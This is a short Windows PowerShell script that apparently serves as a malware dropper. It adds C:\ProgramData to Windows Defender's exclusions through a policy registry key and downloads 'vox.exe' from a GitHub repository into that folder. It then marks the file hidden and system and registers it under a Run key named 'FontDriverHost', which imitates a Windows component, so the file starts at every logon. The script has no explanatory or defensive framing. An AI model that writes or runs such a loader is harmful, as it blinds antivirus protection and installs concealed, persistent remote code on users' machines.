reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /f /reg:64
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData" /d 0 /f /reg:64

$filePath1 = "C:\ProgramData\vox.exe"
$expectedHash1 = "6DC4800983F992A3D12457086485E2664F678A7FE0CA78DE36A059C84A7D571E"
$url1 = "https://github.com/scripthelpercode/00scripthelpx/raw/refs/heads/main/vox.exe"

if (!(Test-Path $filePath1) -or ((Get-FileHash $filePath1 -Algorithm SHA256).Hash -ne $expectedHash1)) {
    Remove-Item -Path $filePath1 -Force
    Invoke-WebRequest -Uri $url1 -OutFile $filePath1
    (Get-Item $filePath1).Attributes = 'ReadOnly, Hidden, System'
}

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "FontDriverHost" /d "$filePath1" /f
